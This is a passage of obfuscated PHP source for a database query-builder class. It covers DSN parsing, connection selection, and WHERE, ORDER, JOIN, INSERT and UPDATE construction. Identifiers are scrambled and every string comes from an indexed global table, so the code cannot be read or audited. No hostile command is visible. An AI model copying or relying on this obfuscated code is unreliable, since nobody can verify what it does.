$ô–›øÙ[$¥”å·ò[977]], $¥”å·ò[21] => $ô–›øÙ[$¥”å·ò[978]], $¥”å·ò[922] => $ô–›øÙ[$¥”å·ò[979]], $¥”å·ò[17] => isset($ô–›øÙ[$¥”å·ò[980]]) ? $ô–›øÙ[$¥”å·ò[980]] : array()); } elseif (empty($ô–›øÙ)) { if (think_config($¥”å·ò[981]) && $¥”å·ò[970] != strtolower(think_config($¥”å·ò[982]))) { $ô–›øÙ = $this->parseDSN(think_config($¥”å·ò[981])); } else { $ô–›øÙ = array($¥”å·ò[967] => think_config($¥”å·ò[982]), $¥”å·ò[894] => think_config($¥”å·ò[983]), $¥”å·ò[895] => think_config($¥”å·ò[984]), $¥”å·ò[892] => think_config($¥”å·ò[985]), $¥”å·ò[893] => think_config($¥”å·ò[986]), $¥”å·ò[21] => think_config($¥”å·ò[246]), $¥”å·ò[922] => think_config($¥”å·ò[981]), $¥”å·ò[17] => think_config($¥”å·ò[987])); } } return $ô–›øÙ; } protected function initConnect($Ğäƒ€ñ¸ = true) { if (1 == think_config($_SERVER[§ŒØóıü][22])) { $this->_linkID = $this->multiConnect($Ğäƒ€ñ¸); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $³É…–ıü => $µËÂù¹ğ) { $this->_linkID = $µËÂù¹ğ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ü€ğèÈµ = false) { $İæøÄƒ =& $_SERVER[§ŒØóıü]; static $ŒÒ»«˜¤ = array(); static $‡…½ÙşÃ = -1; if (empty($ŒÒ»«˜¤)) { foreach ($this->config as $íÛ²—ğÌ => $ÒÄ½ä´) { $ŒÒ»«˜¤[$íÛ²—ğÌ] = explode($İæøÄƒ[50], $ÒÄ½ä´); } } if (think_config($İæøÄƒ[988])) { if ($ü€ğèÈµ || think_config($İæøÄƒ[395]) === !0) { $ Ş€ê³ç = floor(mt_rand(0, think_config($İæøÄƒ[989]) - 1)); $‡…½ÙşÃ = $ Ş€ê³ç; } else { if (is_numeric(think_config($İæøÄƒ[990]))) { $ Ş€ê³ç = think_config($İæøÄƒ[990]); } else { $ Ş€ê³ç = floor(mt_rand(think_config($İæøÄƒ[989]), count($ŒÒ»«˜¤[$İæøÄƒ[892]]) - 1)); } } } else { $ Ş€ê³ç = floor(mt_rand(0, count($ŒÒ»«˜¤[$İæøÄƒ[892]]) - 1)); $‡…½ÙşÃ = $ Ş€ê³ç; } $ Ş€ê³ç = $‡…½ÙşÃ !== -1 ? $‡…½ÙşÃ : $ Ş€ê³ç; $™«Ë‰¬ƒ = array($İæøÄƒ[894] => isset($ŒÒ»«˜¤[$İæøÄƒ[894]][$ Ş€ê³ç]) ? $ŒÒ»«˜¤[$İæøÄƒ[894]][$ Ş€ê³ç] : $ŒÒ»«˜¤[$İæøÄƒ[894]][0], $İæøÄƒ[895] => isset($ŒÒ»«˜¤[$İæøÄƒ[895]][$ Ş€ê³ç]) ? $ŒÒ»«˜¤[$İæøÄƒ[895]][$ Ş€ê³ç] : $ŒÒ»«˜¤[$İæøÄƒ[895]][0], $İæøÄƒ[892] => isset($ŒÒ»«˜¤[$İæøÄƒ[892]][$ Ş€ê³ç]) ? $ŒÒ»«˜¤[$İæøÄƒ[892]][$ Ş€ê³ç] : $ŒÒ»«˜¤[$İæøÄƒ[892]][0], $İæøÄƒ[893] => isset($ŒÒ»«˜¤[$İæøÄƒ[893]][$ Ş€ê³ç]) ? $ŒÒ»«˜¤[$İæøÄƒ[893]][$ Ş€ê³ç] : $ŒÒ»«˜¤[$İæøÄƒ[893]][0], $İæøÄƒ[21] => isset($ŒÒ»«˜¤[$İæøÄƒ[21]][$ Ş€ê³ç]) ? $ŒÒ»«˜¤[$İæøÄƒ[21]][$ Ş€ê³ç] : $ŒÒ»«˜¤[$İæøÄƒ[21]][0], $İæøÄƒ[922] => isset($ŒÒ»«˜¤[$İæøÄƒ[922]][$ Ş€ê³ç]) ? $ŒÒ»«˜¤[$İæøÄƒ[922]][$ Ş€ê³ç] : $ŒÒ»«˜¤[$İæøÄƒ[922]][0], $İæøÄƒ[17] => isset($ŒÒ»«˜¤[$İæøÄƒ[17]][$ Ş€ê³ç]) ? $ŒÒ»«˜¤[$İæøÄƒ[17]][$ Ş€ê³ç] : $ŒÒ»«˜¤[$İæøÄƒ[17]][0]); return $this->connect($™«Ë‰¬ƒ, $ Ş€ê³ç); } public function parseDSN($â±ÎÎï¥) { $úÉŒºıÆ =& $_SERVER[§ŒØóıü]; if (empty($â±ÎÎï¥)) { return !1; } $ÖÈåÓ½ø = parse_url($â±ÎÎï¥); if ($ÖÈåÓ½ø[$úÉŒºıÆ[181]]) { $êŠ»„ÈÁ = array($úÉŒºıÆ[967] => $ÖÈåÓ½ø[$úÉŒºıÆ[181]], $úÉŒºıÆ[894] => isset($ÖÈåÓ½ø[$úÉŒºıÆ[590]]) ? $ÖÈåÓ½ø[$úÉŒºıÆ[590]] : $úÉŒºıÆ[12], $úÉŒºıÆ[895] => isset($ÖÈåÓ½ø[$úÉŒºıÆ[991]]) ? $ÖÈåÓ½ø[$úÉŒºıÆ[991]] : $úÉŒºıÆ[12], $úÉŒºıÆ[892] => isset($ÖÈåÓ½ø[$úÉŒºıÆ[182]]) ? $ÖÈåÓ½ø[$úÉŒºıÆ[182]] : $úÉŒºıÆ[12], $úÉŒºıÆ[893] => isset($ÖÈåÓ½ø[$úÉŒºıÆ[183]]) ? $ÖÈåÓ½ø[$úÉŒºıÆ[183]] : $úÉŒºıÆ[12], $úÉŒºıÆ[21] => isset($ÖÈåÓ½ø[$úÉŒºıÆ[84]]) ? substr($ÖÈåÓ½ø[$úÉŒºıÆ[84]], 1) : $úÉŒºıÆ[12]); } else { preg_match($úÉŒºıÆ[992], trim($â±ÎÎï¥), $ƒŸ¨Ô°); $êŠ»„ÈÁ = array($úÉŒºıÆ[967] => $ƒŸ¨Ô°[1], $úÉŒºıÆ[894] => $ƒŸ¨Ô°[2], $úÉŒºıÆ[895] => $ƒŸ¨Ô°[3], $úÉŒºıÆ[892] => $ƒŸ¨Ô°[4], $úÉŒºıÆ[893] => $ƒŸ¨Ô°[5], $úÉŒºıÆ[21] => $ƒŸ¨Ô°[6]); } $êŠ»„ÈÁ[$úÉŒºıÆ[922]] = $úÉŒºıÆ[12]; return $êŠ»„ÈÁ; } protected function debug() { $³¹Ã÷¤¿ =& $_SERVER[§ŒØóıü]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $³¹Ã÷¤¿[993]; if (think_config($³¹Ã÷¤¿[994])) { think_status($³¹Ã÷¤¿[995]); think_trace($this->queryStr . $³¹Ã÷¤¿[996] . think_status($³¹Ã÷¤¿[24], $³¹Ã÷¤¿[995], 6) . $³¹Ã÷¤¿[997], $³¹Ã÷¤¿[12], $³¹Ã÷¤¿[998]); } } protected function parseLock($ıé˜àï = false) { $Àì©Ñ¼— =& $_SERVER[§ŒØóıü]; if (!$ıé˜àï) { return $Àì©Ñ¼—[12]; } if ($Àì©Ñ¼—[924] == $this->dbType) { return $Àì©Ñ¼—[999]; } return $Àì©Ñ¼—[1000]; } protected function parseSet($áº€ÏßÖ) { $œà¬­¡â =& $_SERVER[§ŒØóıü]; foreach ($áº€ÏßÖ as $œ·Øæé² => $¥ÓªÃÔ) { if (is_array($¥ÓªÃÔ) && $œà¬­¡â[297] == $¥ÓªÃÔ[0]) { $§Äõ£§Ö[] = $this->parseKey($œ·Øæé²) . $œà¬­¡â[890] . $¥ÓªÃÔ[1]; } elseif (is_scalar($¥ÓªÃÔ) || is_null($¥ÓªÃÔ)) { $§Äõ£§Ö[] = $this->parseKey($œ·Øæé²) . $œà¬­¡â[890] . $this->parseValue($¥ÓªÃÔ); } } return $œà¬­¡â[1001] . implode($œà¬­¡â[50], $§Äõ£§Ö); } protected function bindParam($»ğàŠ•‹, $¸Ç˜…ÔÅ) { $this->bind[$_SERVER[§ŒØóıü][4] . $»ğàŠ•‹] = $¸Ç˜…ÔÅ; } protected function parseBind($ÙÆÃŒ¬Ä) { $ÙÆÃŒ¬Ä = array_merge($this->bind, $ÙÆÃŒ¬Ä); $this->bind = array(); return $ÙÆÃŒ¬Ä; } function parseKey(&$¦ş¦ˆº‹, $¾¤È€¦ = true) { if ($¾¤È€¦) { $¦ş¦ˆº‹ = $this->parseKeyCheck($¦ş¦ˆº‹); } return $¦ş¦ˆº‹; } function parseKeyCheck($ÅİÕÃ¯Ã) { $å»–™óõ =& $_SERVER[§ŒØóıü]; $ÅİÕÃ¯Ã = trim($ÅİÕÃ¯Ã); if (!preg_match($å»–™óõ[1002], $ÅİÕÃ¯Ã)) { think_exception($å»–™óõ[1003] . $ÅİÕÃ¯Ã); } return $ÅİÕÃ¯Ã; } protected function parseValue($š½ß¾ê) { $¬Òêšæ‘ =& $_SERVER[§ŒØóıü]; if (is_string($š½ß¾ê)) { $š½ß¾ê = $¬Òêšæ‘[963] . $this->escapeString($š½ß¾ê) . $¬Òêšæ‘[963]; } elseif (isset($š½ß¾ê[0]) && is_string($š½ß¾ê[0]) && strtolower($š½ß¾ê[0]) == $¬Òêšæ‘[297]) { $š½ß¾ê = $this->escapeString($š½ß¾ê[1]); } elseif (is_array($š½ß¾ê)) { $š½ß¾ê = array_map(array($this, $¬Òêšæ‘[964]), $š½ß¾ê); } elseif (is_bool($š½ß¾ê)) { $š½ß¾ê = $š½ß¾ê ? $¬Òêšæ‘[88] : $¬Òêšæ‘[198]; } elseif (is_null($š½ß¾ê)) { $š½ß¾ê = $¬Òêšæ‘[103]; } return $š½ß¾ê; } protected function parseField($é¤º‡¶¡) { $¤àÑúÆ =& $_SERVER[§ŒØóıü]; if (is_string($é¤º‡¶¡) && strpos($é¤º‡¶¡, $¤àÑúÆ[50])) { $é¤º‡¶¡ = explode($¤àÑúÆ[50], $é¤º‡¶¡); } if (is_array($é¤º‡¶¡)) { $­Â±Âã« = array(); foreach ($é¤º‡¶¡ as $ÓÚ—ÑòÒ => $ó©Ìì²) { if (!is_numeric($ÓÚ—ÑòÒ)) { $­Â±Âã«[] = $this->parseKey($ÓÚ—ÑòÒ, !1) . $¤àÑúÆ[1004] . $this->parseKey($ó©Ìì²); } else { $­Â±Âã«[] = $this->parseKey($ó©Ìì²); } } $ú¬•‘¨ = implode($¤àÑúÆ[50], $­Â±Âã«); } elseif (is_string($é¤º‡¶¡) && !empty($é¤º‡¶¡)) { $ú¬•‘¨ = $é¤º‡¶¡; } else { $ú¬•‘¨ = $¤àÑúÆ[189]; } return $ú¬•‘¨; } protected function parseTable($¦—Á‘ª) { $èßâî¹ò =& $_SERVER[§ŒØóıü]; if (is_array($¦—Á‘ª)) { $Ğ«Õ™ = array(); foreach ($¦—Á‘ª as $Ô¬°õ•º => $ÂÈ¾¶Ë) { if (!is_numeric($Ô¬°õ•º)) { $Ğ«Õ™[] = $this->parseKey($Ô¬°õ•º) . $èßâî¹ò[53] . $this->parseKey($ÂÈ¾¶Ë); } else { $Ğ«Õ™[] = $this->parseKey($Ô¬°õ•º); } } $¦—Á‘ª = $Ğ«Õ™; } elseif (is_string($¦—Á‘ª)) { if (strstr($¦—Á‘ª, $èßâî¹ò[53])) { return $¦—Á‘ª; } $¦—Á‘ª = explode($èßâî¹ò[50], $¦—Á‘ª); array_walk($¦—Á‘ª, array($this, $èßâî¹ò[912])); } return $èßâî¹ò[906] . trim(implode($èßâî¹ò[1005], $¦—Á‘ª), $èßâî¹ò[385]) . $èßâî¹ò[906]; } protected function parseWhere($Û°å×ö) { $ø•Á—ÈŒ =& $_SERVER[§ŒØóıü]; $ô¤§ÛÏ = $ø•Á—ÈŒ[12]; if (is_string($Û°å×ö)) { $ô¤§ÛÏ = $Û°å×ö; } else { $†Œí¼ = isset($Û°å×ö[$ø•Á—ÈŒ[1006]]) ? strtoupper($Û°å×ö[$ø•Á—ÈŒ[1006]]) : $ø•Á—ÈŒ[12]; if (in_array($†Œí¼, array($ø•Á—ÈŒ[1007], $ø•Á—ÈŒ[1008], $ø•Á—ÈŒ[1009]))) { $†Œí¼ = $ø•Á—ÈŒ[53] . $†Œí¼ . $ø•Á—ÈŒ[53]; unset($Û°å×ö[$ø•Á—ÈŒ[1006]]); } else { $†Œí¼ = $ø•Á—ÈŒ[1010]; } foreach ($Û°å×ö as $İÖçß±¯ => $àí‡‡ñ“) { $ô¤§ÛÏ .= $ø•Á—ÈŒ[277]; if (is_numeric($İÖçß±¯)) { $İÖçß±¯ = $ø•Á—ÈŒ[1011]; } if (0 === strpos($İÖçß±¯, $ø•Á—ÈŒ[11])) { $ô¤§ÛÏ .= $this->parseThinkWhere($İÖçß±¯, $àí‡‡ñ“); } else { if (!preg_match($ø•Á—ÈŒ[1012], trim($İÖçß±¯))) { think_exception(think_lang($ø•Á—ÈŒ[1013]) . $ø•Á—ÈŒ[4] . $İÖçß±¯); } $‡®Ä¹™Ì = is_array($àí‡‡ñ“) && isset($àí‡‡ñ“[$ø•Á—ÈŒ[1014]]); $İÖçß±¯ = trim($İÖçß±¯); if (strpos($İÖçß±¯, $ø•Á—ÈŒ[283])) { $¥Å‚¡šî = explode($ø•Á—ÈŒ[283], $İÖçß±¯); $È¤Ä²—Õ = array(); foreach ($¥Å‚¡šî as $šµŸß–ˆ => $üËšÚê) { $ÍìşËˆÅ = $‡®Ä¹™Ì ? $àí‡‡ñ“[$šµŸß–ˆ] : $àí‡‡ñ“; $È¤Ä²—Õ[] = $ø•Á—ÈŒ[260] . $this->parseWhereItem($this->parseKey($üËšÚê), $ÍìşËˆÅ) . $ø•Á—ÈŒ[911]; } $ô¤§ÛÏ .= implode($ø•Á—ÈŒ[1015], $È¤Ä²—Õ); } elseif (strpos($İÖçß±¯, $ø•Á—ÈŒ[284])) { $¥Å‚¡šî = explode($ø•Á—ÈŒ[284], $İÖçß±¯); $È¤Ä²—Õ = array(); foreach ($¥Å‚¡šî as $šµŸß–ˆ => $üËšÚê) { $ÍìşËˆÅ = $‡®Ä¹™Ì ? $àí‡‡ñ“[$šµŸß–ˆ] : $àí‡‡ñ“; $È¤Ä²—Õ[] = $ø•Á—ÈŒ[260] . $this->parseWhereItem($this->parseKey($üËšÚê), $ÍìşËˆÅ) . $ø•Á—ÈŒ[911]; } $ô¤§ÛÏ .= implode($ø•Á—ÈŒ[1010], $È¤Ä²—Õ); } else { $ô¤§ÛÏ .= $this->parseWhereItem($this->parseKey($İÖçß±¯), $àí‡‡ñ“); } } $ô¤§ÛÏ .= $ø•Á—ÈŒ[278] . $†Œí¼; } $ô¤§ÛÏ = substr($ô¤§ÛÏ, 0, -strlen($†Œí¼)); } return empty($ô¤§ÛÏ) ? $ø•Á—ÈŒ[12] : $ø•Á—ÈŒ[1016] . $ô¤§ÛÏ; } protected function parseWhereItem($’Ì¬¯º, $ù®ÃŒ§) { $«´ë¢Î™ =& $_SERVER[§ŒØóıü]; $áÉš«Å» = $«´ë¢Î™[12]; if (is_array($ù®ÃŒ§)) { if (is_string($ù®ÃŒ§[0])) { $ÓóØ£ï = strtolower($ù®ÃŒ§[0]); if (in_array($ù®ÃŒ§[0], array($«´ë¢Î™[890], $«´ë¢Î™[1017], $«´ë¢Î™[1018], $«´ë¢Î™[1019], $«´ë¢Î™[1020], $«´ë¢Î™[1021]))) { $áÉš«Å» .= $’Ì¬¯º . $«´ë¢Î™[53] . $ù®ÃŒ§[0] . $«´ë¢Î™[53] . $this->parseValue($ù®ÃŒ§[1]); } elseif (preg_match($«´ë¢Î™[1022], $ù®ÃŒ§[0])) { $áÉš«Å» .= $’Ì¬¯º . $«´ë¢Î™[53] . $this->exp[$ÓóØ£ï] . $«´ë¢Î™[53] . $this->parseValue($ù®ÃŒ§[1]); } elseif (preg_match($«´ë¢Î™[1023], $ù®ÃŒ§[0])) { if (is_array($ù®ÃŒ§[1])) { $ôàŠÂ “ = isset($ù®ÃŒ§[2]) ? strtoupper($ù®ÃŒ§[2]) : $«´ë¢Î™[1008]; if (in_array($ôàŠÂ “, array($«´ë¢Î™[1007], $«´ë¢Î™[1008], $«´ë¢Î™[1009]))) { $µ¹šÄ = array(); foreach ($ù®ÃŒ§[1] as $Úüğİåà) { $µ¹šÄ[] = $’Ì¬¯º . $«´ë¢Î™[53] . $this->exp[$ÓóØ£ï] . $«´ë¢Î™[53] . $this->parseValue($Úüğİåà); } $áÉš«Å» .= $«´ë¢Î™[260] . implode($«´ë¢Î™[53] . $ôàŠÂ “ . $«´ë¢Î™[53], $µ¹šÄ) . $«´ë¢Î™[911]; } } else { $áÉš«Å» .= $’Ì¬¯º . $«´ë¢Î™[53] . $this->exp[$ÓóØ£ï] . $«´ë¢Î™[53] . $this->parseValue($ù®ÃŒ§[1]); } } elseif ($«´ë¢Î™[297] == $ÓóØ£ï) { $áÉš«Å» .= $«´ë¢Î™[909] . $’Ì¬¯º . $«´ë¢Î™[53] . $ù®ÃŒ§[1] . $«´ë¢Î™[1024]; } elseif (preg_match($«´ë¢Î™[1025], $ù®ÃŒ§[0])) { $áÉš«Å» .= $ù®ÃŒ§[0]; } elseif (preg_match($«´ë¢Î™[1026], $ù®ÃŒ§[0])) { if (isset($ù®ÃŒ§[2]) && $«´ë¢Î™[297] == $ù®ÃŒ§[2]) { $áÉš«Å» .= $’Ì¬¯º . $«´ë¢Î™[53] . $this->exp[$ÓóØ£ï] . $«´ë¢Î™[53] . $ù®ÃŒ§[1]; } else { if (is_string($ù®ÃŒ§[1])) { $ù®ÃŒ§[1] = explode($«´ë¢Î™[50], $ù®ÃŒ§[1]); } $ü“¯É©¹ = implode($«´ë¢Î™[50], $this->parseValue($ù®ÃŒ§[1])); $áÉš«Å» .= $’Ì¬¯º . $«´ë¢Î™[53] . $this->exp[$ÓóØ£ï] . $«´ë¢Î™[909] . $ü“¯É©¹ . $«´ë¢Î™[911]; } } elseif (preg_match($«´ë¢Î™[1027], $ù®ÃŒ§[0])) { $ÌÎ¥¦ä = is_string($ù®ÃŒ§[1]) ? explode($«´ë¢Î™[50], $ù®ÃŒ§[1]) : $ù®ÃŒ§[1]; $áÉš«Å» .= $«´ë¢Î™[909] . $’Ì¬¯º . $«´ë¢Î™[53] . $this->exp[$ÓóØ£ï] . $«´ë¢Î™[53] . $this->parseValue($ÌÎ¥¦ä[0]) . $«´ë¢Î™[1010] . $this->parseValue($ÌÎ¥¦ä[1]) . $«´ë¢Î™[278]; } else { think_exception(think_lang($«´ë¢Î™[1013]) . $«´ë¢Î™[4] . $ù®ÃŒ§[0]); } } else { $×“¹üÕ‚ = count($ù®ÃŒ§); $¬ÇÌ³ = $«´ë¢Î™[12]; if (is_string($ù®ÃŒ§[$×“¹üÕ‚ - 1])) { $¬ÇÌ³ = isset($ù®ÃŒ§[$×“¹üÕ‚ - 1]) ? strtoupper($ù®ÃŒ§[$×“¹üÕ‚ - 1]) : $«´ë¢Î™[12]; if (in_array($¬ÇÌ³, array($«´ë¢Î™[1007], $«´ë¢Î™[1008], $«´ë¢Î™[1009]))) { $×“¹üÕ‚ = $×“¹üÕ‚ - 1; } } else { $¬ÇÌ³ = $«´ë¢Î™[1007]; } for ($İìò•Úñ = 0; $İìò•Úñ < $×“¹üÕ‚; $İìò•Úñ++) { $ÌÎ¥¦ä = is_array($ù®ÃŒ§[$İìò•Úñ]) ? $ù®ÃŒ§[$İìò•Úñ][1] : $ù®ÃŒ§[$İìò•Úñ]; if ($«´ë¢Î™[297] == strtolower($ù®ÃŒ§[$İìò•Úñ][0])) { $áÉš«Å» .= $«´ë¢Î™[260] . $’Ì¬¯º . $«´ë¢Î™[53] . $ÌÎ¥¦ä . $«´ë¢Î™[1024] . $¬ÇÌ³ . $«´ë¢Î™[53]; } else { $ŞİêúËî = is_array($ù®ÃŒ§[$İìò•Úñ]) ? $this->exp[strtolower($ù®ÃŒ§[$İìò•Úñ][0])] : $«´ë¢Î™[890]; if (!$ŞİêúËî && is_array($ù®ÃŒ§[$İìò•Úñ]) && in_array($ù®ÃŒ§[$İìò•Úñ][0], array($«´ë¢Î™[890], $«´ë¢Î™[1017], $«´ë¢Î™[1018], $«´ë¢Î™[1019], $«´ë¢Î™[1020], $«´ë¢Î™[1021]))) { $ŞİêúËî = $ù®ÃŒ§[$İìò•Úñ][0]; } $áÉš«Å» .= $«´ë¢Î™[260] . $’Ì¬¯º . $«´ë¢Î™[53] . $ŞİêúËî . $«´ë¢Î™[53] . $this->parseValue($ÌÎ¥¦ä) . $«´ë¢Î™[1024] . $¬ÇÌ³ . $«´ë¢Î™[53]; } } $áÉš«Å» = substr($áÉš«Å», 0, -4); } } else { $áÉš«Å» .= $’Ì¬¯º . $«´ë¢Î™[1028] . $this->parseValue($ù®ÃŒ§); } return $áÉš«Å»; } protected function parseThinkWhere($òå£¼·š, $á—íšåÁ) { $ë–Ù¤ =& $_SERVER[§ŒØóıü]; $¨•®Û¹ë = $ë–Ù¤[12]; switch ($òå£¼·š) { case $ë–Ù¤[352]: $¨•®Û¹ë = $á—íšåÁ; break; case $ë–Ù¤[1011]: $¨•®Û¹ë = is_string($á—íšåÁ) ? $á—íšåÁ : substr($this->parseWhere($á—íšåÁ), 6); break; case $ë–Ù¤[1029]: parse_str($á—íšåÁ, $—«ØÁ¹); if (isset($—«ØÁ¹[$ë–Ù¤[1006]])) { $ÏÂæ‹ÈÙ = $ë–Ù¤[53] . strtoupper($—«ØÁ¹[$ë–Ù¤[1006]]) . $ë–Ù¤[53]; unset($—«ØÁ¹[$ë–Ù¤[1006]]); } else { $ÏÂæ‹ÈÙ = $ë–Ù¤[1010]; } $©ï³Áá = array(); foreach ($—«ØÁ¹ as $Èà¢Â”Á => $«•îïÂŠ) { $©ï³Áá[] = $this->parseKey($Èà¢Â”Á) . $ë–Ù¤[1028] . $this->parseValue($«•îïÂŠ); } $¨•®Û¹ë = implode($ÏÂæ‹ÈÙ, $©ï³Áá); break; } return $¨•®Û¹ë; } protected function parseLimit($ÊŞÙ ”Â) { $ş‡Äë€ú =& $_SERVER[§ŒØóıü]; return !empty($ÊŞÙ ”Â) ? $ş‡Äë€ú[51] . $ÊŞÙ ”Â . $ş‡Äë€ú[53] : $ş‡Äë€ú[12]; } protected function parseJoin($õçş´°¼) { $Äè¯ïÓ =& $_SERVER[§ŒØóıü]; $Ùá²ÇÃç = $Äè¯ïÓ[12]; if (!empty($õçş´°¼)) { if (is_array($õçş´°¼)) { foreach ($õçş´°¼ as $êòõùã£ => $ş•şªû”) { if (!1 !== stripos($ş•şªû”, $Äè¯ïÓ[1030])) { $Ùá²ÇÃç .= $Äè¯ïÓ[53] . $ş•şªû”; } else { $Ùá²ÇÃç .= $Äè¯ïÓ[1031] . $ş•şªû”; } } } else { $Ùá²ÇÃç .= $Äè¯ïÓ[1031] . $õçş´°¼; } } $Ùá²ÇÃç = preg_replace($Äè¯ïÓ[1032], think_config($Äè¯ïÓ[936]) . $Äè¯ïÓ[1033], $Ùá²ÇÃç); return $Ùá²ÇÃç; } protected function parseOrder($ÎüËÒƒ») { $®ÀŸÓØŒ =& $_SERVER[§ŒØóıü]; if (is_array($ÎüËÒƒ»)) { $åØºÄªè = array(); foreach ($ÎüËÒƒ» as $ı‰ÓÓş => $ªÍ­Á¹å) { if (is_numeric($ı‰ÓÓş)) { $åØºÄªè[] = $this->parseKey($ªÍ­Á¹å); } else { $ªÍ­Á¹å = in_array(strtoupper(trim($ªÍ­Á¹å)), array($®ÀŸÓØŒ[1034], $®ÀŸÓØŒ[1035])) ? $®ÀŸÓØŒ[53] . $ªÍ­Á¹å : $®ÀŸÓØŒ[12]; if (preg_match($®ÀŸÓØŒ[1036], $ı‰ÓÓş)) { $åØºÄªè[] = $this->parseKey($ı‰ÓÓş) . $ªÍ­Á¹å; } else { think_exception($®ÀŸÓØŒ[1037] . $ı‰ÓÓş); } } } $ÎüËÒƒ» = implode($®ÀŸÓØŒ[50], $åØºÄªè); } return !empty($ÎüËÒƒ») ? $®ÀŸÓØŒ[1038] . $ÎüËÒƒ» : $®ÀŸÓØŒ[12]; } protected function parseGroup($°È®èÆ·) { $·Êµ• =& $_SERVER[§ŒØóıü]; return !empty($°È®èÆ·) ? $·Êµ•[1039] . $°È®èÆ· : $·Êµ•[12]; } protected function parseHaving($ÙÓ³ëş ) { $¦Ñı«¨ =& $_SERVER[§ŒØóıü]; return !empty($ÙÓ³ëş ) ? $¦Ñı«¨[1040] . $ÙÓ³ëş  : $¦Ñı«¨[12]; } protected function parseComment($ø«¦ÃÒÏ) { $®ÑîŞ¬ =& $_SERVER[§ŒØóıü]; return !empty($ø«¦ÃÒÏ) ? $®ÑîŞ¬[1041] . $ø«¦ÃÒÏ . $®ÑîŞ¬[1042] : $®ÑîŞ¬[12]; } protected function parseDistinct($ÊÚ©÷‘˜) { $÷¼™±Š¡ =& $_SERVER[§ŒØóıü]; return !empty($ÊÚ©÷‘˜) ? $÷¼™±Š¡[1043] : $÷¼™±Š¡[12]; } protected function parseUnion($Ëšü®µˆ) { $áîÍæ„ø =& $_SERVER[§ŒØóıü]; if (empty($Ëšü®µˆ)) { return $áîÍæ„ø[12]; } if (isset($Ëšü®µˆ[$áîÍæ„ø[348]])) { $×˜ÄİÕÁ = $áîÍæ„ø[1044]; unset($Ëšü®µˆ[$áîÍæ„ø[348]]); } else { $×˜ÄİÕÁ = $áîÍæ„ø[1045]; } foreach ($Ëšü®µˆ as $™ÌÍ†µƒ) { $´ç–Ã¢‡[] = $×˜ÄİÕÁ . (is_array($™ÌÍ†µƒ) ? $this->buildSelectSql($™ÌÍ†µƒ) : $™ÌÍ†µƒ); } return implode($áîÍæ„ø[53], $´ç–Ã¢‡); } public function insert($ØœÀœÓ, $íİªÕ‡İ = array(), $ù‰“Œ¤¢ = false) { $ÓòÇÖƒ¦ =& $_SERVER[§ŒØóıü]; $ú¦ÕÎè£ = $ª”ùÓªï = array(); $this->model = $íİªÕ‡İ[$ÓòÇÖƒ¦[281]]; foreach ($ØœÀœÓ as $˜ËòÌÅ => $Å»¤ïğé) { if (is_array($Å»¤ïğé) && $ÓòÇÖƒ¦[297] == $Å»¤ïğé[0]) { $ª”ùÓªï[] = $this->parseKey($˜ËòÌÅ); $ú¦ÕÎè£[] = $Å»¤ïğé[1]; } elseif (is_scalar($Å»¤ïğé) || is_null($Å»¤ïğé)) { $ª”ùÓªï[] = $this->parseKey($˜ËòÌÅ); $ú¦ÕÎè£[] = $this->parseValue($Å»¤ïğé); } } $˜®ÈÅ‡Õ = ($ù‰“Œ¤¢ ? $ÓòÇÖƒ¦[913] : $ÓòÇÖƒ¦[914]) . $ÓòÇÖƒ¦[915] . $this->parseTable($íİªÕ‡İ[$ÓòÇÖƒ¦[279]]) . $ÓòÇÖƒ¦[909] . implode($ÓòÇÖƒ¦[50], $ª”ùÓªï) . $ÓòÇÖƒ¦[910] . implode($ÓòÇÖƒ¦[50], $ú¦ÕÎè£) . $ÓòÇÖƒ¦[911]; $˜®ÈÅ‡Õ .= $this->parseLock(isset($íİªÕ‡İ[$ÓòÇÖƒ¦[849]]) ? $íİªÕ‡İ[$ÓòÇÖƒ¦[849]] : !1); $˜®ÈÅ‡Õ .= $this->parseComment(!empty($íİªÕ‡İ[$ÓòÇÖƒ¦[354]]) ? $íİªÕ‡İ[$ÓòÇÖƒ¦[354]] : $ÓòÇÖƒ¦[12]); return $this->execute($˜®ÈÅ‡Õ, $this->parseBind(!empty($íİªÕ‡İ[$ÓòÇÖƒ¦[285]]) ? $íİªÕ‡İ[$ÓòÇÖƒ¦[285]] : array())); } public function selectInsert($—•ØàôÀ, $µòœ„é, $†»‡¬Îé = array()) { $Õå ëù· =& $_SERVER[§ŒØóıü]; $this->model = $†»‡¬Îé[$Õå ëù·[281]]; if (is_string($—•ØàôÀ)) { $—•ØàôÀ = explode($Õå ëù·[50], $—•ØàôÀ); } array_walk($—•ØàôÀ, array($this, $Õå ëù·[912])); $‰ëÄúğ¤ = $Õå ëù·[1046] . $this->parseTable($µòœ„é) . $Õå ëù·[909] . implode($Õå ëù·[50], $—•ØàôÀ) . $Õå ëù·[1024]; $‰ëÄúğ¤ .= $this->buildSelectSql($†»‡¬Îé); return $this->execute($‰ëÄúğ¤, $this->parseBind(!empty($†»‡¬Îé[$Õå ëù·[285]]) ? $†»‡¬Îé[$Õå ëù·[285]] : array())); } public function update($¾¼Öœü‡, $¸´ÊŸÒ) { $¦õ›‰š¡ =& $_SERVER[§ŒØóıü]; $this->model = $¸´ÊŸÒ[$¦õ›‰š¡[281]]; $Ú™ñƒ²¬ = $¦õ›‰š¡[1047] . $this->parseTable($¸´ÊŸÒ[$¦õ›‰š¡[279]]) . $this->parseSet($¾¼Öœü‡) . $this->parseWhere(!empty($¸´ÊŸÒ[$¦õ›‰š¡[275]]) ? $¸´ÊŸÒ[$¦õ›‰š¡[275]] : $¦õ›‰š¡[12]) . $this->parseOrder(!empty($¸´ÊŸÒ[$¦õ›‰š¡[365]]) ? $¸´ÊŸÒ[$¦õ›‰š¡[365]] : $¦õ›‰š¡[12]) . $this->parseLimit(!empty($¸´ÊŸÒ[$¦õ›‰š¡[292]]) ? $¸´ÊŸÒ[$¦õ›‰š¡[292]] : $¦õ›‰š¡[12]) . $this->parseLock(isset($¸´ÊŸÒ[$¦õ›‰š¡[849]]) ? $¸´ÊŸÒ[$¦õ›‰š¡[849]] : !1) . $this->parseComment(!empty($¸´ÊŸÒ[$¦õ›‰š¡[354]]) ? $¸´ÊŸÒ[$¦õ›‰š¡[354]] : $¦õ›‰š¡[12]); return $this->execute($Ú™ñƒ²¬, 